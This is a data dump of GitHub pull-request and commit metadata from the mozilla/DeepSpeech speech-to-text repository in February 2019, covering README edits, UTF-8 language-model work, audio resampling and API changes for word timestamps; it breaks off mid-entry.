2388,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1914,1914,short readme for data dir,,JRMeyer,8389864,2019-02-28T00:43:50Z,CONTRIBUTOR,True,9,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3ce06ede9d2ac98f9c1757690839847d6179726,"generate_trie, not kenlm"
2389,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1914,1914,short readme for data dir,,JRMeyer,8389864,2019-02-28T00:43:50Z,CONTRIBUTOR,True,9,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73ebc5027770dec80837f495f44a82fa4adf6434,capitalize
2390,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5b09b04e9b707e60485af6bd88663f47a1f3218,WIP utf-8 target
2391,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e05f1eb6c90b160ca9180ad5aad479233b02c03,utf8
2392,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06fbec6e0ddaa52b0cf98f7ee310629b22aa14c6,utf8 slovenian
2393,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94cd473251dc993a41448e4f75de42a24ff3216e,rm .install
2394,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a59865c7c780560dca5da7490288f04a6eab73d,type
2395,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6eb9f1a0b891cca5d6ee616ab535b409581e4e49,"rebasing onto master

utf8"
2396,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c556d5dab0edf66346d2e5bc4ab66910efd63dff,"utf8 slovenian

rm .install

type

cluster-things

sl"
2397,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5d7386959ecd3b7c7d0132fd21fc095021f23bb,merge-remote
2398,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ddc1f544ebe4b0b454b587703ed69b0bfc04308,script to make alphabet/lm/trie on cluster
2399,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a773133c7fceacade536df0192401b66f47267c,lm from scratch:)
2400,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34d9f9a02a7e35f215c50bc885f5937dc818f75e,kenlm fun
2401,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9845775d83fec05c120257453ca034d27b0466b,utf8-zh
2402,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09d81028880c999ddcb531b5dbf56dc1ff02a1fc,cleaning
2403,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,597f9c0095e804f844329146c389cf2ed1c96ea8,taskcluster
2404,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5bed887ddc7cd05dff8955f1ff7a40bd4c9d101,remove bazel
2405,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ddd58c6f7a71aa2bcfc904c87f11bf649d79399,moving files / binaries onto server
2406,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7f266959208a535be0bdbe4b29a5855df8bbc98,trains:)
2407,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd7c07a8fb9864bed28ff3dea0b3bf44795c1774,native_client without compiled c++
2408,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,530ba2d0db651564481fa9366503a4fe6bb342c8,got kenlm / generate_trie / ds_ctcdecode all on server... running from abs-paths now
2409,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,059408428195ac2b1a4d6ada0bbc4e9c09c2c7aa,wheel
2410,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac3416ef7ef5f9573e5e90fad13906a3e8f1ffb2,"utf-8 working, trying with and without scorer in evatluate.py"
2411,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d85d178b4619dba37d97bbd5090712d9ef27cf0a,scorer
2412,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb8e90fdadbe8ffe85049ec197c993bc00848796,test-output-file
2413,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6079dcef3a297058d95327bc75d24ca9b080a32f,test-output-file
2414,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1911,1911,DO NOT MERGE - utf8-zh,,JRMeyer,8389864,2019-02-27T23:52:17Z,CONTRIBUTOR,False,276,137,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0bd30d17ce4ce719a361c5baa9217279a5cf0201,decoder bytes
2415,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5b09b04e9b707e60485af6bd88663f47a1f3218,WIP utf-8 target
2416,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e05f1eb6c90b160ca9180ad5aad479233b02c03,utf8
2417,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06fbec6e0ddaa52b0cf98f7ee310629b22aa14c6,utf8 slovenian
2418,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94cd473251dc993a41448e4f75de42a24ff3216e,rm .install
2419,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a59865c7c780560dca5da7490288f04a6eab73d,type
2420,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6eb9f1a0b891cca5d6ee616ab535b409581e4e49,"rebasing onto master

utf8"
2421,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c556d5dab0edf66346d2e5bc4ab66910efd63dff,"utf8 slovenian

rm .install

type

cluster-things

sl"
2422,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5d7386959ecd3b7c7d0132fd21fc095021f23bb,merge-remote
2423,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ddc1f544ebe4b0b454b587703ed69b0bfc04308,script to make alphabet/lm/trie on cluster
2424,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a773133c7fceacade536df0192401b66f47267c,lm from scratch:)
2425,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34d9f9a02a7e35f215c50bc885f5937dc818f75e,kenlm fun
2426,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9845775d83fec05c120257453ca034d27b0466b,utf8-zh
2427,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09d81028880c999ddcb531b5dbf56dc1ff02a1fc,cleaning
2428,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,597f9c0095e804f844329146c389cf2ed1c96ea8,taskcluster
2429,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5bed887ddc7cd05dff8955f1ff7a40bd4c9d101,remove bazel
2430,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ddd58c6f7a71aa2bcfc904c87f11bf649d79399,moving files / binaries onto server
2431,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7f266959208a535be0bdbe4b29a5855df8bbc98,trains:)
2432,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1909,1909,utf8-zh,DO NOT MERGE - just need compilation on TaskCluster,JRMeyer,8389864,2019-02-26T22:55:07Z,CONTRIBUTOR,False,233,131,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd7c07a8fb9864bed28ff3dea0b3bf44795c1774,native_client without compiled c++
2433,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1908,1908,Cleaning up the native_client README,,JRMeyer,8389864,2019-02-26T22:07:56Z,CONTRIBUTOR,True,58,43,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc2f7a9f3491c2857c56365caa63cad7af7ffc1c,readability
2434,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1908,1908,Cleaning up the native_client README,,JRMeyer,8389864,2019-02-26T22:07:56Z,CONTRIBUTOR,True,58,43,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1ccbcf92cd49cbe99cd150617337392ff098fa9,more clean-up
2435,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1908,1908,Cleaning up the native_client README,,JRMeyer,8389864,2019-02-26T22:07:56Z,CONTRIBUTOR,True,58,43,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45bbac61dffec459eb45b86937ed385e65bcf33f,"reformatting --- and question for Reuben

@reuben --- this README seems to double itself... do we really need separate ""Building"" and Installation sections?

I can't tell because I don't understand well enough, but this README is still super confusing to me."
2436,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1908,1908,Cleaning up the native_client README,,JRMeyer,8389864,2019-02-26T22:07:56Z,CONTRIBUTOR,True,58,43,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd8993f417f21ba7b04b9be7341f732892b21685,"two main sections

(1) installing our binaries
(2) building and installing your own binaries"
2437,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1908,1908,Cleaning up the native_client README,,JRMeyer,8389864,2019-02-26T22:07:56Z,CONTRIBUTOR,True,58,43,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,14016b818818a1786fb0b76574fc48f8c283a47a,reuben's comments
2438,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1907,1907,short readme for taskcluster dir,,JRMeyer,8389864,2019-02-26T17:54:29Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6c728314387e7e0783af907efbb2ab6e81415e0,short readme for taskcluster dir
2439,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1907,1907,short readme for taskcluster dir,,JRMeyer,8389864,2019-02-26T17:54:29Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,54d4c6fa4c0b6d5e21cc42bcfc3d7ba114197dd8,Capitalize and mention files
2440,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1904,1904,Remove useless appcompat-v7 on libdeepspeech Java,,lissyx,1645737,2019-02-26T09:14:47Z,COLLABORATOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff88ab2a62b602b411e04e4e7a32bfd3047cfe7e,Remove useless appcompat-v7 on libdeepspeech Java
2441,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1903,1903,Josh readme,Small changes to README for readability.,JRMeyer,8389864,2019-02-26T01:04:59Z,CONTRIBUTOR,True,49,44,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49281f1fe8a77a310a40f955b43222c1897d8c67,readme
2442,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1903,1903,Josh readme,Small changes to README for readability.,JRMeyer,8389864,2019-02-26T01:04:59Z,CONTRIBUTOR,True,49,44,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76a898e7ecf204709ef4f3426375408a60fbcb5c,word order
2443,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1903,1903,Josh readme,Small changes to README for readability.,JRMeyer,8389864,2019-02-26T01:04:59Z,CONTRIBUTOR,True,49,44,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19d9210051d38d59b712ba9fd137316afbc83866,reuben's comments
2444,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1903,1903,Josh readme,Small changes to README for readability.,JRMeyer,8389864,2019-02-26T01:04:59Z,CONTRIBUTOR,True,49,44,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a157319e44c5e36167b6d25b42d567e88272bae,Merge branch 'master' into josh-readme
2445,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1901,1901,Feature/resample examples mic vad streaming input rate ,"Hi deepseech mods!
I have added scipy to this module for signal resampling. 
It has been tested and seems to work better than ever.

If the microphone rate is the same as the network, (16000) no resampling necessary.
Happy to make any modifications if suggested.

cheers,
Jordan",jorxster,12818611,2019-02-23T00:40:37Z,CONTRIBUTOR,True,65,19,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56df4ebf03fbe52c78fd5b510b2e74e4613e0a0c,"Add Input Rate to examples/mic_vad_streaming.
Add -r for input device sample rate and -d for device index by PyAudio"
2446,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1901,1901,Feature/resample examples mic vad streaming input rate ,"Hi deepseech mods!
I have added scipy to this module for signal resampling. 
It has been tested and seems to work better than ever.

If the microphone rate is the same as the network, (16000) no resampling necessary.
Happy to make any modifications if suggested.

cheers,
Jordan",jorxster,12818611,2019-02-23T00:40:37Z,CONTRIBUTOR,True,65,19,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dedf2911dacb0df6635e534b177240ebe5946390,Add resampling to microphone stream if different from processing sample rate. Uses scipy.signal
2447,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1901,1901,Feature/resample examples mic vad streaming input rate ,"Hi deepseech mods!
I have added scipy to this module for signal resampling. 
It has been tested and seems to work better than ever.

If the microphone rate is the same as the network, (16000) no resampling necessary.
Happy to make any modifications if suggested.

cheers,
Jordan",jorxster,12818611,2019-02-23T00:40:37Z,CONTRIBUTOR,True,65,19,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77b2f8f3ecaa8178d1a1c6a18457f2d5351b8678,Address pull request feedback from @lissyx
2448,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1900,1900,add simple nodejs example,"Added a simple example using NodeJS bindings, single script, single wav file.",dsteinman,3894317,2019-02-22T22:54:15Z,CONTRIBUTOR,True,149,1,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c3d56b8c0415fa87fe780b96e5f3b87d5db1248,Add a Nodejs wav file example
2449,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1899,1899,Use venv module in .compute script,"This should fix any pip/pip3, python/python3 executable naming issues and work consistently in developer machines as well as the cluster.",reuben,477142,2019-02-22T16:39:09Z,MEMBER,True,8,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9437afd8437229c3fb64ca87867d53f8890d33b,Use venv module in .compute script
2450,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1897,1897,Add Input Rate to examples/mic_vad_streaming,"Have added a separate input process rate for microphones that support different rates, and changed to 44100.",jorxster,12818611,2019-02-21T08:56:00Z,CONTRIBUTOR,False,55,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56df4ebf03fbe52c78fd5b510b2e74e4613e0a0c,"Add Input Rate to examples/mic_vad_streaming.
Add -r for input device sample rate and -d for device index by PyAudio"
2451,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1896,1896,Update TensorFlow TaskCluster artifacts,,lissyx,1645737,2019-02-20T21:16:16Z,COLLABORATOR,True,19,19,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76aa4b6fa866d4f3a256f7f1f4a84c07f9ee9d15,Update TensorFlow TaskCluster artifacts
2452,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1895,1895,Add Windows build doc,"Please suggest any changes.

",carlfm01,32177100,2019-02-20T16:29:59Z,COLLABORATOR,True,135,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f9f9e4643d93cdd2f2cc0b4537163508d7036330,Add Windows build doc
2453,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1894,1894,Use latest TS dataset,see https://github.com/nicolaspanel/TrainingSpeech#last-releases--download for more info,nicolaspanel,2500584,2019-02-20T09:09:09Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,881e55e842754db8badf641850470811d14d314c,"Use latest TS dataset

see https://github.com/nicolaspanel/TrainingSpeech#last-releases--download for more info"
2454,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1893,1893,Client changes to output word time positions in JSON format,"This adds a -e flag to trigger JSON metadata output.

It also takes into account the new format of DS_SpeechToText which now requires an additional extended_metadata parameter.

Related to #1892.",dabinat,18251622,2019-02-20T04:42:50Z,COLLABORATOR,False,11,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b5b0dfae6ce577bd2b742fa7758d7c8880b1715,"Client changes to output word time positions in JSON format

This adds a -e flag to trigger JSON metadata output.

It also takes into account the new format of DS_SpeechToText which now requires an additional extended_metadata parameter."
2455,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
